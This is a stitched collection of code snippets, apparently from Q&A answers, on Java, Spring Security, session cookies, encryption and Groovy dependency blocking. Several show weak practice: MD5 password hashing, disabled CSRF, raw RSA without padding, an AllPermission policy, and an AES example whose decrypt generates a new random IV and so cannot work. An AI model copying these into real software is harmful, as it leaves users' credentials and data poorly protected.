    <?import javafx.scene.control.*?>
    <?import javafx.scene.layout.*?>
    <?import javafx.scene.web.*?>
    
    <AnchorPane id="AnchorPane" fx:id="pane" prefHeight="367.0" prefWidth="446.0" xmlns:fx="http://javafx.com/fxml" fx:controller="webviewtest.jdk8.FXMLDocumentController">
      <children>
        <WebView fx:id="webView" prefHeight="367.0" prefWidth="446.0" AnchorPane.bottomAnchor="0.0" AnchorPane.leftAnchor="0.0" AnchorPane.rightAnchor="0.0" AnchorPane.topAnchor="0.0" />
      </children>
    </AnchorPane>
---UNIQUEIDFORSNIP---|190808577|    Cipher.getInstance("RSA")
---UNIQUEIDFORSNIP---|190808581|    Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
---UNIQUEIDFORSNIP---|190928685|    # simply add an property to store the session key
    class User(db.Model):    
        username = db.StringProperty()
        password = db.StringProperty()
        session = db.StringProperty()
---UNIQUEIDFORSNIP---|190928687|    # Do the following step:
    # 1. make sure user provide correct username and password
    # 2. generate a random session key 
    # 3. store the session key to datastore
    # 4. set the session key and user name in cookie
    class LoginAPI( Webapp.RequestHandler ):   
        def get(self):
            username = self.getVar( 'username', username )
            password = self.getVar( 'password', password )
    
            user = User.all().filter("username = ", username).get()
            password = encrypted_the_password(password) # encrypted your password with your own method!
            
            if user.password == password:
                 # User login successfually
                 session = generate_random_session_key() # generate your session key here
                 user.session = session
                 user.put()
      
                 expires_time = decide_your_expires_time() # decide how long the login session is alive.
                 cookie_time_format = "%a, %d-%b-%Y %H:%M:%S GMT"
                 expires_datetime = datetime.datetime.fromtimestamp(expires_time)
            
                 # set cookie as session
                 self.response.headers.add_header( "Set-Cookie", "user=%s; expires=%s; path=/" % ( user.username,expires_datetime.strftime( cookie_time_format ) ) )
                 self.response.headers.add_header( "Set-Cookie", "session=%s; expires=%s; path=/" % ( user.session, expires_datetime.strftime( cookie_time_format ) ) )
            else:
                 #User login failed
                 pass
---UNIQUEIDFORSNIP---|190928689|    # Remove the previous cookie info 
    class LoginAPI( Webapp.RequestHandler ):
            def get(self):
                # remove the cookie
                self.response.headers.add_header( "Set-Cookie", "user=%s; expires=%s; path=/" % ( "",expires_datetime.strftime( cookie_time_format ) ) )
                self.response.headers.add_header( "Set-Cookie", "session=%s; expires=%s; path=/" % ( "", expires_datetime.strftime( cookie_time_format ) ) )
---UNIQUEIDFORSNIP---|190928691|    # Get the session info from cookie. If the session info match the info stored in datastore
    # Then user authenticate successfully.
    class SomePage(Webapp.RequestHandler):
        def get(self):
            # get cookie info
            username_from_cookie = self.request.cookies.get("user", "")
            session_from_cookie = self.request.cookies.get("session", "")
    
            if username_from_cookie and session_from_cookie:
                user = User.all().filter("username = ", username_from_cookie).get()
                if user.session == session_from_cookie:
                    # the user is login correctly
                    pass
                else:
                    # the user is not login
                    pass
            else:
                # the user is not login
                pass
---UNIQUEIDFORSNIP---|191076130|    @Override
    public void configure(WebSecurity web) throws Exception {
        web
            .ignoring()
            .antMatchers("/resources/**")
            .antMatchers("/publics/**");
    }
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
            .antMatchers("/admin/**").hasRole("ADMIN")
            .antMatchers("/publics/**").hasRole("USER") // no effect
            .anyRequest().authenticated();
    }
---UNIQUEIDFORSNIP---|191076134|    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
            .antMatchers("/**").hasRole("USER")
         	.antMatchers("/admin/**").hasRole("ADMIN"):
    }
---UNIQUEIDFORSNIP---|191105750|    cert.getExtensionValue(X509Extension.cRLDistributionPoints.getId());
    String skiOid = X509Extension.authorityKeyIdentifier.getId();
---UNIQUEIDFORSNIP---|191105752|    X500Name x500name = X500Name.getInstance(x509cert.getSubjectX500Principal().getEncoded());
    RDN cn = x500name.getRDNs(BCStyle.CN)[0];
    String cnAsString = IETFUtils.valueToString(cn.getFirst().getValue());
---UNIQUEIDFORSNIP---|191488142|    before(Privilege privilege, User user) : @annotation(privilege) &&
                                      call(* *.*(User, User)) && args(.., user) {
        if (!accessAllowed(privilege.getLevel(), user))
            throw new InsufficientRightsException()
    }
---UNIQUEIDFORSNIP---|191499789|    pointcut check(Access access) : 
    execution(@Access * *(..)) && @annotation(access);
---UNIQUEIDFORSNIP---|191563192|    file:///C:/Users/Greg/Projects/Enventive/En360_UI/WebContent/DynamicTreeDemo.jar
    file:///C:/Users/Greg/Projects/Enventive/En360_UI/WebContent/dynamictree_webstart_no_codebase.jnlp
---UNIQUEIDFORSNIP---|191811966|    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
---UNIQUEIDFORSNIP---|191811969|    frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
---UNIQUEIDFORSNIP---|191944962|    ...
    @Override
    protected void addCustomAuthorities(String username, List<GrantedAuthority> authorities) {
        super.addCustomAuthorities(username, authorities);
      
        List<GrantedAuthority> additional = new ArrayList<GrantedAuthority>();
        for (GrantedAuthority role : authorities) {
            additional .addAll(vourMappingService.getAdditionalForRole(role));
        }
        authorities.addAll(additional );
    }
---UNIQUEIDFORSNIP---|191944964|    public class YourMappingService
   
     /**
         * Property bases mapping of roles to privileges.
         * Every role is one line, the privileges are comma separated.
         */
        private Properties roleToPrivileges;
    
        public YourMappingService(Properties roleToPrivileges) {
            if (roleToPrivileges == null) {
                throw new IllegalArgumentException("roleToPrivileges must not be null");
            }
            this.roleToPrivileges = roleToPrivileges;
        }
    
        @Override
        public Collection<? extends GrantedAuthority> getAdditionalForRole(GrantedAuthority role) {
            
            String authority = role.getAuthority();
            if(authority != null) {
                String commaSeparatedPrivileges = roleToPrivileges.getProperty(role.getAuthority());
                if (commaSeparatedPrivileges != null) {
                    List<GrantedAuthority> privileges = new ArrayList<GrantedAuthority>();
                    for(String privilegeName : StringUtils.commaDelimitedListToSet(commaSeparatedPrivileges)) {
                        privileges.add(new GrantedAuthorityImpl(privilegeName.trim()));
                    }                
                    return privileges;
                } else {
                    return Collections.emptyList();
                }
            } else {
                return Collections.emptyList();
            }
        }   
    }
---UNIQUEIDFORSNIP---|191944966|	<bean id="myUserDetailsService" class="de.humanfork.springsecurityroles.impl.JdbcDaoPrivilegesImpl">
		<constructor-arg ref="yourMappingService"/>
		<property name="dataSource" ref="dataSource"/>
		<property name="usersByUsernameQuery" value="SELECT login,encryptedPassword,loginEnabled FROM user WHERE login = ?"/>
		<property name="enableAuthorities" value="true"/>
		<property name="authoritiesByUsernameQuery" value="SELECT u.login, r.securityRoles FROM user u, user2security_roles r WHERE u.login= ? AND u.id = r. User_fk;"/>
	</bean>
      <bean id="yourMappingService" class="ZourMappingService">
		<constructor-arg>
			<props>
			<prop key="ROLE_ADMIN">
					ROLE_backend_access,
					ROLE_user_mngt,
					ROLE_passwordLostRequest_mngt,
					ROLE_log_mngt
				</prop>
				<prop key="ROLE_USER">
				</prop>
			</props>
		</constructor-arg>
	</bean>
---UNIQUEIDFORSNIP---|191969461|    encoded = s.bytes.encodeBase64().toString()
---UNIQUEIDFORSNIP---|191988220|      private void destroyMe(String destroyMe) {
        try {
          int len = destroyMe.length();
          Field f = destroyMe.getClass().getDeclaredField("value");
          f.setAccessible(true);
          char[] stars = new char[len];
          Arrays.fill(stars, '*');
          f.set(destroyMe, stars);
          f.setAccessible(false);
        } catch (IllegalArgumentException e) {
          e.printStackTrace();
        } catch (IllegalAccessException e) {
          e.printStackTrace();
        } catch (SecurityException e) {
          e.printStackTrace();
        } catch (NoSuchFieldException e) {
          e.printStackTrace();
        }
      }
---UNIQUEIDFORSNIP---|192009716|    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.IOException;
    import java.io.InputStream;
    import java.security.InvalidAlgorithmParameterException;
    import java.security.InvalidKeyException;
    import java.security.NoSuchAlgorithmException;
    import java.security.SecureRandom;
    import java.security.spec.InvalidKeySpecException;
    import java.security.spec.KeySpec;
    import java.util.Base64;
    import java.util.Date;
    import java.util.Optional;
    
    import javax.crypto.BadPaddingException;
    import javax.crypto.Cipher;
    import javax.crypto.IllegalBlockSizeException;
    import javax.crypto.NoSuchPaddingException;
    import javax.crypto.SecretKey;
    import javax.crypto.SecretKeyFactory;
    import javax.crypto.spec.IvParameterSpec;
    import javax.crypto.spec.PBEKeySpec;
    import javax.crypto.spec.SecretKeySpec;
    import javax.mail.Message;
    import javax.mail.MessagingException;
    import javax.mail.Multipart;
    import javax.mail.Session;
    import javax.mail.internet.InternetAddress;
    import javax.mail.internet.MimeBodyPart;
    import javax.mail.internet.MimeMessage;
    import javax.mail.internet.MimeMultipart;
    
    public class Stackoverflow {
    
    	private static final int keySize = 128;
    	static byte[] saltForThisRun = new byte[8];
    	static {
    		SecureRandom random = new SecureRandom();
    		random.nextBytes(saltForThisRun);
    	}
    
    	public static void main(
    			String[] args) throws Exception {
    		Message message = buildTestMessage("from@null.org", new String[] { "to@null.org", "to2@null.org" },
    				"Subject is needed here", Optional.of("This is just a text"), Optional.empty());
    
    		char[] password = "password".toCharArray();
    		String encryptedMsg = encrypt(password, saltForThisRun, message);
    		System.out.println("encryptedMsg: " + encryptedMsg);
    		Message message2 = decrypt(password, saltForThisRun, encryptedMsg);
    
    		// out sth. like from@domain <--> null
    		System.out.println(message.getFrom()[0] + " <--> " + message2.getFrom()[0]);
    
    	}
    
    	private static Message decrypt(
    			char[] password,
    			byte[] salt,
    			String base64CipherText) throws EncryptionException {
    		try {
    			SecretKey secretKey = generateKey(password, salt, keySize);
    			byte[] initializationVector = createInitializationVector(keySize);
    
    			Cipher aesCipherForDecryption = Cipher.getInstance("AES/CBC/PKCS5PADDING");
    
    			aesCipherForDecryption.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(initializationVector));
    			byte[] decryptedByteCipherText = Base64.getDecoder().decode(base64CipherText);
    			byte[] byteDecryptedMessage = aesCipherForDecryption.doFinal(decryptedByteCipherText);
    			return createMessageFromBytes(byteDecryptedMessage);
    		} catch (IllegalStateException | InvalidKeyException | InvalidAlgorithmParameterException
    				| NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeySpecException
    				| IllegalBlockSizeException | BadPaddingException | MessagingException e) {
    			throw new EncryptionException(String.format("Unable to enrypt message due to: %s", e.getMessage()), e);
    		}
    	}
    
    	/**
    	 * 
    	 * @param password
    	 * @param salt
    	 * @param message
    	 * @param charArray
    	 * @return Base64 encoded CipherText
    	 * @throws EncryptionException
    	 *             If sth. goes wrong
    	 */
    	private static String encrypt(
    			char[] password,
    			byte[] salt,
    			Message message) throws EncryptionException {
    		try {
    			/**
    			 * Step 1. Generate an AES key with password and salt
    			 * 
    			 */
    			SecretKey secretKey = generateKey(password, salt, keySize);
    			System.out.println(secretKey.getEncoded().length);
    
    			/**
    			 * Step 2. Generate an Initialization Vector (IV)
    			 * a. Use SecureRandom to generate random bits
    			 * The size of the IV matches the blocksize of the cipher (e.g. 128 bits for AES)
    			 * b. Construct the appropriate IvParameterSpec object for the data to pass to Cipher's init() method
    			 */
    			byte[] initializationVector = createInitializationVector(keySize);
    
    			/**
    			 * Step 3. Create a Cipher by specifying the following parameters
    			 * a. Algorithm name - here it is AES
    			 * b. Mode - here it is CBC mode
    			 * c. Padding - e.g. PKCS7 or PKCS5
    			 * 
    			 * Must specify the mode explicitly as most JCE providers default to ECB mode!!
    			 */
    			Cipher aesCipherForEncryption = Cipher.getInstance("AES/CBC/PKCS5PADDING");
    
    			/**
    			 * Step 4. Initialize the Cipher for Encryption
    			 */
    			aesCipherForEncryption.init(Cipher.ENCRYPT_MODE, secretKey, new IvParameterSpec(initializationVector));
    
    			/**
    			 * Step 5. Encrypt the Data
    			 * a. Declare / Initialize the Data. Here the data is of type String
    			 * b. Convert the Input Text to Bytes
    			 * c. Encrypt the bytes using doFinal method
    			 */
    			byte[] byteCipherText = updateCipherWithMessage(aesCipherForEncryption, message);
    			return new String(Base64.getEncoder().encode(byteCipherText));
    
    		} catch (IllegalBlockSizeException | BadPaddingException | IOException | MessagingException
    				| InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException
    				| NoSuchPaddingException | InvalidKeySpecException e) {
    			throw new EncryptionException(String.format("Unable to enrypt message due to: %s", e.getMessage()), e);
    		}
    
    	}
    
    	private static MimeMessage createMessageFromBytes(
    			byte[] decodedBytes) throws MessagingException {
    		InputStream is = new ByteArrayInputStream(decodedBytes);
    		Session session = null;
    		return new MimeMessage(session, is);
    	}
    
    	private static byte[] updateCipherWithMessage(
    			Cipher cipher,
    			Message message) throws IOException, MessagingException, IllegalBlockSizeException, BadPaddingException {
    		ByteArrayOutputStream os = new ByteArrayOutputStream();
    		try {
    			message.writeTo(os);
    			return cipher.doFinal(os.toByteArray());
    		} finally {
    			os.close();
    		}
    	}
    
    	private static byte[] createInitializationVector(
    			int keyLength) {
    		// Save the IV bytes or send it in plaintext with the encrypted data so you can decrypt the data later
    		byte[] iv = new byte[keyLength / 8];
    
    		SecureRandom prng = new SecureRandom();
    		prng.nextBytes(iv);
    		return iv;
    	}
    
    	private static SecretKey generateKey(
    			char[] password,
    			byte[] salt,
    			int keySize) throws InvalidKeySpecException, NoSuchAlgorithmException {
    		int nIterations = 65536;
    		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
    		KeySpec spec = new PBEKeySpec(password, salt, nIterations, keySize);
    		SecretKey tmp = factory.generateSecret(spec);
    		return new SecretKeySpec(tmp.getEncoded(), "AES");
    	}
    
    	private static Message buildTestMessage(
    			String from,
    			String[] to,
    			String subject,
    			Optional<String> text,
    			Optional<String> html) throws Exception {
    		String replyto = from;
    		Session session = null;
    		Message message = new MimeMessage(session);
    		Multipart multiPart = new MimeMultipart("alternative");
    
    		try {
    
    			if (text.isPresent()) {
    				MimeBodyPart textPart = new MimeBodyPart();
    				textPart.setText(text.get(), "utf-8");
    				multiPart.addBodyPart(textPart);
    			}
    			if (html.isPresent()) {
    				MimeBodyPart htmlPart = new MimeBodyPart();
    				htmlPart.setContent(html, "text/html; charset=utf-8");
    				multiPart.addBodyPart(htmlPart);
    			}
    
    			message.setContent(multiPart);
    
    			if (from != null) {
    				message.setFrom(new InternetAddress(from));
    			} else
    				message.setFrom();
    
    			if (replyto != null)
    				message.setReplyTo(new InternetAddress[] { new InternetAddress(replyto) });
    			else
    				message.setReplyTo(new InternetAddress[] { new InternetAddress(from) });
    
    			InternetAddress[] toAddresses = new InternetAddress[to.length];
    			for (int i = 0; i < toAddresses.length; i++) {
    				toAddresses[i] = new InternetAddress(to[i]);
    			}
    			message.setRecipients(Message.RecipientType.TO, toAddresses);
    			message.setSubject(subject);
    			message.setSentDate(new Date());
    
    			return message;
    
    		} catch (Exception e) {
    			e.printStackTrace();
    			System.out.println("Exception: " + e.getMessage());
    			throw e;
    
    		}
    
    	}
    
    }
---UNIQUEIDFORSNIP---|192057529|    static String hexEncode(byte [] data) {
        StringBuilder hex = new StringBuilder();
        for (byte b : data) hex.append(String.format("%02x", b));
        return hex.toString();
    }
    String hash = hexEncode(md.digest());
---UNIQUEIDFORSNIP---|192110972|    private static void initConnnector(Server server, Configs configObj) {
        SelectChannelConnector connector = new SelectChannelConnector();
        //Don't set any host , or the port detection will failed. -_-#
        //connector.setHost("127.0.0.1");
        connector.setPort(configObj.getPort());
        if (configObj.getEnablessl() && configObj.getSslport() != null)
            connector.setConfidentialPort(configObj.getSslport());
        server.addConnector(connector);
        if (configObj.getEnablessl() && configObj.getSslport() != null)
            initSSL(server, configObj.getSslport(), configObj.getKeystore(),
                    configObj.getPassword(), configObj.getKeyPassword(),
                    configObj.getNeedClientAuth());
    }
---UNIQUEIDFORSNIP---|192110975|    org.eclipse.jetty.server.Connector.setHost(String)
---UNIQUEIDFORSNIP---|192210649|    import groovy.grape.Grape
    
    Grape.metaClass.static.grab = {String endorsed ->
        throw new SecurityException("Oh no you didn't! Grabbing is forbidden.")
    }
    
    Grape.metaClass.static.grab = {Map dependency ->
        throw new SecurityException("Oh no you didn't! Grabbing is forbidden.")
    }
    
    Grape.metaClass.static.grab = {Map args, Map dependency ->
        throw new SecurityException("Oh no you didn't! Grabbing is forbidden.")
    }
    
    def source1 = '''
    println('This is a nice safe Groovy script.')
    '''
    
    def source2 = '''
    @Grab('commons-validator:commons-validator:1.4.1')
    
    import org.apache.commons.validator.routines.EmailValidator
    
    def emailValidator = EmailValidator.getInstance();
    
    assert emailValidator.isValid('what.a.shame@us.elections.gov')
    assert !emailValidator.isValid('an_invalid_emai_address')
    
    println 'You should not see this message!'
    '''
    
    def script
    def shell = new GroovyShell()
    
    try {
        script = shell.parse(source1)
        script.run()
    } catch (Exception e) { 
        assert false, "Oh, oh. That wasn't supposed to happen :("
    }    
    
    try {
        script = shell.parse(source2)
        assert false, "Oh, oh. That wasn't supposed to happen :("
    } catch (ExceptionInInitializerError e) { 
        println 'Naughty script was blocked when parsed.'
    }  
---UNIQUEIDFORSNIP---|192210653|    Grape.metaClass.static.grab = {String endorsed ->
        throw new SecurityException("Oh no you didn't! Grabbing is forbidden.")
    }
    
    Grape.metaClass.static.grab = {Map dependency ->
        throw new SecurityException("Oh no you didn't! Grabbing is forbidden.")
    }
    
    Grape.metaClass.static.grab = {Map args, Map dependency ->
        throw new SecurityException("Oh no you didn't! Grabbing is forbidden.")
    }
---UNIQUEIDFORSNIP---|192210656|    @groovy.lang.Grab(module = 'commons-validator', group = 'commons-validator', version = '1.4.1')
    import org.apache.commons.validator.routines.EmailValidator as EmailValidator
    
    public class script1440223706571 extends groovy.lang.Script { 
    
        private static org.codehaus.groovy.reflection.ClassInfo $staticClassInfo 
        public static transient boolean __$stMC 
    
        public script1440223706571() {
        }
    
        public script1440223706571(groovy.lang.Binding context) {
            super(context)
        }
    
        public static void main(java.lang.String[] args) {
            org.codehaus.groovy.runtime.InvokerHelper.runScript(script1440223706571, args)
        }
    
        public java.lang.Object run() {
            java.lang.Object emailValidator = org.apache.commons.validator.routines.EmailValidator.getInstance()
            assert emailValidator.isValid('what.a.shame@us.elections.gov') : null
            assert !(emailValidator.isValid('an_invalid_emai_address')) : null
            return null
        }
    
        static { 
            groovy.grape.Grape.grab([:], ['group': 'commons-validator', 'module': 'commons-validator', 'version': '1.4.1'])
        }
    
        protected groovy.lang.MetaClass $getStaticMetaClass() {
        }
    
    }
---UNIQUEIDFORSNIP---|192210662|    import groovy.grape.GrapeIvy
    
    def source1 = '''
    println('This is a nice safe Groovy script.')
    '''
    
    def source2 = '''
    @Grab('commons-validator:commons-validator:1.4.1')
    
    import org.apache.commons.validator.routines.EmailValidator
    
    def emailValidator = EmailValidator.getInstance();
    
    assert emailValidator.isValid('what.a.shame@us.elections.gov')
    assert !emailValidator.isValid('an_invalid_emai_address')
    
    println 'You should not see this message!'
    '''
    
    def script
    def shell = new GroovyShell()
    def proxy = ProxyMetaClass.getInstance(GrapeIvy)
    
    proxy.interceptor = new GrapeInterceptor({group, module, version ->
        if(group == 'commons-validator' && module == 'commons-validator') false
        else true
    })
    
    proxy.use {
        shell.parse(source1).run()
        
        try {
            shell.parse(source2).run()
        } catch (org.codehaus.groovy.control.MultipleCompilationErrorsException e) {
            assert e.message.contains('unable to resolve class')
        }
    }
    
    @groovy.transform.TupleConstructor
    class GrapeInterceptor implements Interceptor {
        private boolean invokeMethod = true
        Closure authorizer
         
        def afterInvoke(Object object, String methodName, Object[] arguments, Object result) {
            invokeMethod = true
    
            return result
        }
        
        def beforeInvoke(Object object, String methodName, Object[] arguments) {
            if(methodName == 'createGrabRecord') {
                def dependencies = arguments[0]
                invokeMethod = authorizer(dependencies.group, dependencies.module, dependencies.version)
            } else {
                invokeMethod = true
            }
            
            return null
        }
        
        boolean doInvoke() { invokeMethod }
    }
---UNIQUEIDFORSNIP---|192621520|    <Directory /home/*/public_html>	-- You can change this location
    	MaxConnPerIP 1	
    	OnlyIPLimit audio/mpeg video
    </Directory>
---UNIQUEIDFORSNIP---|192673723|    import java.applet.*;
    import java.awt.*;
    import java.awt.event.*;
    import java.io.*;
    import java.security.*;
    public class localfile extends Applet {
    private static final long serialVersionUID = 1L;
    public localfile() {
      Panel p = new Panel();
      p.add(new Button("Call from Java"));
      add("North",p);
    }
    public void openFile(String path) {
      System.out.println("File: " + path);
      final File ffile = new File(path);
      System.out.println("Got file.");
      if (Desktop.isDesktopSupported()) {
        System.out.println("Desktop is supported.");
        final Desktop desktop = Desktop.getDesktop();
        System.out.println("Got Desktop Handle.");
        AccessController.doPrivileged(new PrivilegedAction() {
          public Object run() {
            try {
              desktop.open(ffile);
            } catch(Exception ex) {
              ex.printStackTrace();
            }
            return null;
          }
        });
        System.out.println("File Opened.");
      }
    }
    public boolean action(Event evt, Object arg) {
      openFile("/Users/conor/1.txt");
      return true;
    }
    }
---UNIQUEIDFORSNIP---|192762540|    @PreAuthorize("hasRole('ROLE_ADMIN')")
    public void deleteUser(User user) {
      ...
    }
---UNIQUEIDFORSNIP---|192990150|    ...
    
    <Engine name="Catalina" defaultHost="localhost">
      
      <Realm className="org.apache.catalina.realm.CombinedRealm">
    
        <!-- PRIMARY: tomcat-users.xml with critical system users
                      that should always work, DB independent and without lockout
                      NOTE: If the wrong password is given, the secondary path with
                            lockout is still attempted, so that a lockout on that path
                            will still occur and be logged. Still the primary path is not 
                            locked for access by that happening.                           -->
        <Realm className="org.apache.catalina.realm.UserDatabaseRealm"
               resourceName="UserDatabase"/>
    
        <!-- SECONDARY: DataSourceRealm with DB with lockout functionality -->
        <!-- (three level nesting of realms requires Tomcat >= 7.0.33)     -->
        <Realm className="org.apache.catalina.realm.LockOutRealm" 
          failureCount="5" lockOutTime="60" > <!-- note that when an account is locked correct password
                                                   login is no longer possible (would otherwise defeat purpose of lockout),
                                                   but also lockoutTime is still reset in each correct attempt -->
                                                    
          <Realm className="org.apache.catalina.realm.DataSourceRealm"
             dataSourceName="jdbc/authority"
             userTable="user" userNameCol="username" 
             userCredCol="password" digest="SHA"
             userRoleTable="user_role" roleNameCol="rolename" />
                 
        </Realm>
        
      </Realm>
    
      <Host >
    
        ...
    
      </Host>
    </Engine>
    
    ...
---UNIQUEIDFORSNIP---|193006108|    String safeCookieName = URLEncoder.encode(name, "UTF-8");
    String safeCookieValue = URLEncoder.encode(value, "UTF-8");
    response.addCookie(new Cookie(safeCookieName, safeCookieValue));
    // ...
---UNIQUEIDFORSNIP---|193034111|       protected void configure(HttpSecurity http) throws Exception {
        http
            .httpBasic()
                .authenticationEntryPoint(samlEntryPoint());
        http
        	.csrf()
        		.disable();
        http
            .addFilterBefore(metadataGeneratorFilter(), ChannelProcessingFilter.class)
            .addFilterAfter(samlFilter(), BasicAuthenticationFilter.class);
        http        
            .authorizeRequests()
            .antMatchers("/").permitAll()
            .antMatchers("/error").permitAll()
            .antMatchers("/saml/**").permitAll()
            .anyRequest().authenticated();
        http
            .logout()
                .logoutSuccessUrl("/");
    }
---UNIQUEIDFORSNIP---|193034117|        public FilterChainProxy samlFilter() throws Exception {
        List<SecurityFilterChain> chains = new ArrayList<SecurityFilterChain>();
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/login/**"),
                samlEntryPoint()));
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/logout/**"),
                samlLogoutFilter()));
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/metadata/**"),
                metadataDisplayFilter()));
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/SSO/**"),
                samlWebSSOProcessingFilter()));
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/SSOHoK/**"),
                samlWebSSOHoKProcessingFilter()));
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/SingleLogout/**"),
                samlLogoutProcessingFilter()));
        chains.add(new DefaultSecurityFilterChain(new AntPathRequestMatcher("/saml/discovery/**"),
                samlIDPDiscovery()));
        return new FilterChainProxy(chains);
    }
---UNIQUEIDFORSNIP---|193200203|    class A {
      private String method1() {
        return "Hello World!";
      }
    }
    
---UNIQUEIDFORSNIP---|193200205|    import java.lang.reflect.Method;
    
    class B {
      public static void main(String[] args) throws Exception {
        System.setSecurityManager(new SecurityManager());
    	Class clazz = A.class;
    	Method m = clazz.getDeclaredMethod("method1");
    	m.setAccessible(true);
      }
    }
---UNIQUEIDFORSNIP---|193200207|    Exception in thread "main" java.security.AccessControlException: access denied ("java.lang.reflect.ReflectPermission" "suppressAccessChecks")
            at java.security.AccessControlContext.checkPermission(Unknown Source)
            at java.security.AccessController.checkPermission(Unknown Source)
            at java.lang.SecurityManager.checkPermission(Unknown Source)
            at java.lang.reflect.AccessibleObject.setAccessible(Unknown Source)
            at B.main(B.java:8)
---UNIQUEIDFORSNIP---|193200209|    // specific file
    grant codeBase "file:/test/path/tools.jar" {
      // no permissions for this one
    };
    
    // default to giving all
    grant {
      permission java.security.AllPermission;
    };
---UNIQUEIDFORSNIP---|193585721|     /**
     * reads a public key from a file
     * @param filename name of the file to read
     * @param algorithm is usually RSA
     * @return the read public key
     * @throws Exception
     */
    public  PublicKey getPemPublicKey(String filename, String algorithm) throws Exception {
          File f = new File(filename);
          FileInputStream fis = new FileInputStream(f);
          DataInputStream dis = new DataInputStream(fis);
          byte[] keyBytes = new byte[(int) f.length()];
          dis.readFully(keyBytes);
          dis.close();
          String temp = new String(keyBytes);
          String publicKeyPEM = temp.replace("-----BEGIN PUBLIC KEY-----\n", "");
          publicKeyPEM = publicKeyPEM.replace("-----END PUBLIC KEY-----", "");
          BASE64Decoder b64 = new BASE64Decoder();
          byte[] decoded = b64.decodeBuffer(publicKeyPEM);
          X509EncodedKeySpec spec = new X509EncodedKeySpec(decoded);
          KeyFactory kf = KeyFactory.getInstance(algorithm);
          return kf.generatePublic(spec);
    }
---UNIQUEIDFORSNIP---|193594890|    final Provider bc = new BouncyCastleProvider();
    // generating the key from modulus & private exponent
    KeyFactory rsaFactory = KeyFactory.getInstance("RSA", bc);
    RSAPrivateKeySpec spec = new RSAPrivateKeySpec(key.getModulus(), key.getPrivateExponent());
    RSAPrivateKey testKey = (RSAPrivateKey) rsaFactory.generatePrivate(spec);
    // using it in a raw cipher
    Cipher c= Cipher.getInstance("RSA/ECB/NoPadding", bc);
    c.init(Cipher.DECRYPT_MODE, testKey);
    c.doFinal(new byte[] {(byte) 0x7F, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, });
---UNIQUEIDFORSNIP---|193726678|	@Bean
	public ApplicationSecurity applicationSecurity() {
		return new ApplicationSecurity();
	}  
---UNIQUEIDFORSNIP---|193726682|    public class ApplicationSecurity extends WebSecurityConfigurerAdapter {
        @Autowired
        private UserDetailSecurityService userDetailSecurityService;
        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http.csrf().disable().authorizeRequests().antMatchers("/ace/**",
                                                                "/app/**",
                                                                "/jquery/**",
                                                                "/bootstrap/**",
                                                                "/font-awesome/**",
                                                                "/jstree/**",
                                                                "/img/**").permitAll().anyRequest()
                .fullyAuthenticated();
            http.csrf().disable().formLogin().loginPage("/login").failureUrl("/login?error=1").permitAll().defaultSuccessUrl("/configurator").and().logout().permitAll();
            http.headers().frameOptions().disable().addHeaderWriter(new StaticHeadersWriter("X-FRAME-OPTIONS", "SAMEORIGIN"));
        }
        @Override
        public void configure(AuthenticationManagerBuilder auth) throws  Exception {
            auth.userDetailsService(userDetailSecurityService).passwordEncoder(passwordEncoder());
        }
         @Bean
         public PasswordEncoder passwordEncoder(){
             return new MD5PasswordEncoder();
         }
    }
---UNIQUEIDFORSNIP---|193726688|    public class MD5PasswordEncoder implements PasswordEncoder {
         @Override
         public String encode(CharSequence charSequence) {
             String encPass = "";
            try {
                 MessageDigest md = MessageDigest.getInstance("MD5");
                 byte[] digest = md.digest(charSequence.toString().getBytes());
                 byte[] b64 = Base64.encodeBase64(digest);
                 encPass = new String(b64);
                 encPass = encPass.replaceAll("=", "");
             }catch(Exception ex){
                 logger.error("An exception trying to encode a password", ex);
             }
             return encPass;
         }
         @Override
         public boolean matches(CharSequence charSequence, String s) {
             return encode(charSequence).equals(s);
         }
    }
    public interface UserDetailsService {
        UserDetails loadUserByUsername(String var1) throws UsernameNotFoundException;
    }
    @Service
    public class UserDetailSecurityService implements UserDetailsService{
    
        //Here your user service implementation
        @Autowired
        UserService userService;
    
        //yuou need to oeverride this method name
        @Override
        public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
            // you need to create a method in your service to find users by name
            return userService.findByUsername(username);
        }
    }
---UNIQUEIDFORSNIP---|193808159|    <bean id="userApprovalHandler" class="org.springframework.security.oauth2.provider.approval.TokenStoreUserApprovalHandler">
        <property name="tokenStore" ref="tokenStore"/>
    </bean>
---UNIQUEIDFORSNIP---|193945184|    while ((line = mbr.readLine()) != null) 
    {
        enSecretText=encrypt(line);
        bwr.write(enSecretText.toString());
        bwr.newLine();
    }
---UNIQUEIDFORSNIP---|194107956|    @Produces 
    IdentityConfiguration produceIdentityManagementConfiguration() {
        IdentityConfigurationBuilder builder = new IdentityConfigurationBuilder();
        builder
            .named("default")
            .stores()
            .jpa().addCredentialHandler(EmailPasswordCredentialHandler.class)
            .supportAllFeatures().supportType(UserAccount.class);
        return builder.build();
---UNIQUEIDFORSNIP---|194107964|    @RequestScoped
    @Named
    public class AuthenticatorSelector {
   
       @Inject Instance<CustomAuthenticator> customAuthenticator;
       @Inject Instance<IdmAuthenticator> idmAuthenticator;
       private String authenticator;
     
       public String getAuthenticator() {
          return authenticator;
        }
       public void setAuthenticator(String authenticator) {
          this.authenticator = authenticator;
       }
       @Produces
       @PicketLink
       public Authenticator selectAuthenticator() {
